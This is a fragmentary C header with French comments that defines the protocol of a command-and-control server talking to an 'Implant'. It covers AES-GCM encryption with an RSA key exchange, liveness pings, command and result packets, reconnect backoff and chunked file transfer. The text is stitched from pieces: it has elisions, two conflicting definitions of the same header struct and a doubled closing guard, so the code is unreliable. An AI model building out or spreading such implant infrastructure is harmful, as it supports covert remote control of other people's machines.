...
#define FSO_HEADER_SIZE    9             /* MAGIC(4) + TYPE(1) + LENGTH(4) */

#define FSO_IV_SIZE        12            /* AES-GCM IV */
#define FSO_TAG_SIZE       16            /* AES-GCM tag */
#define FSO_KEY_SIZE       32            /* AES-256 */
...
typedef enum {
    ...
    MSG_PING    = 0x03,  /* C2 → Implant : vérification de vie */
    MSG_PONG    = 0x04,  /* Implant → C2 : réponse */
    MSG_KEYX    = 0x05,  /* Implant → C2 : échange de clé (RSA) */
    MSG_AUTH    = 0x06,  /* C2 → Implant : authentification + clé AES */
...
typedef struct __attribute__((packed)) {
    uint32_t magic;    /* FSO_MAGIC */
    uint8_t  type;     /* fso_msg_type_t */
    uint32_t length;   /* taille du payload (big-endian) */
} fso_header_t;

/* ---------- Payload d'une commande ---------- */

typedef struct __attribute__((packed)) {
    uint8_t  cmd_id;   /* fso_cmd_id_t */
    /* suivi de args (UTF-8, variable) */
} fso_cmd_t;
...
typedef struct __attribute__((packed)) {
    uint8_t  cmd_id;   /* fso_cmd_id_t */
    uint8_t  status;   /* fso_status_t */
    /* suivi de output (UTF-8, variable) */
} fso_result_t;

/* ---------- API protocole ---------- */

/* Sérialise un paquet dans un buffer.
 * Retourne la taille totale écrite, ou -1 en cas d'erreur. */
int fso_pack(uint8_t type, const uint8_t *payload, uint32_t payload_len,
             uint8_t *out, size_t out_size);

/* Désérialise un paquet depuis un buffer.
 * Retourne 0 en succès, -1 en cas d'erreur. */
int fso_unpack(const uint8_t *in, size_t in_size,
               fso_header_t *header, const uint8_t **payload);

/* Helpers pour construire un payload de commande. */
int fso_build_cmd(uint8_t cmd_id, const char *args,
                  uint8_t *out, size_t out_size);

/* Helpers pour construire un payload de résultat. */
...
#define FSO_KEEPALIVE_SEC  30            /* ping toutes les 30 s */
#define FSO_TIMEOUT_SEC    60            /* session morte après 60 s sans pong */
#define FSO_RECONNECT_MIN  5             /* backoff min 5 s */
#define FSO_RECONNECT_MAX  300           /* backoff max 5 min */
...
typedef struct __attribute__((packed)) {
    uint32_t magic;    /* FSO_MAGIC */
    uint8_t  type;     /* fso_msg_type_t */
    uint16_t seq_id;   /* numéro de séquence (big-endian) */
    uint32_t length;   /* taille du payload (big-endian) */
} fso_header_t;
...
typedef struct __attribute__((packed)) {
    uint32_t transfer_id;  /* identifiant du transfert */
    uint32_t chunk_index;  /* numéro du chunk (0-based) */
...
#endif /* FSO_PROTOCOL_H */#endif /* FSO_PROTOCOL_H */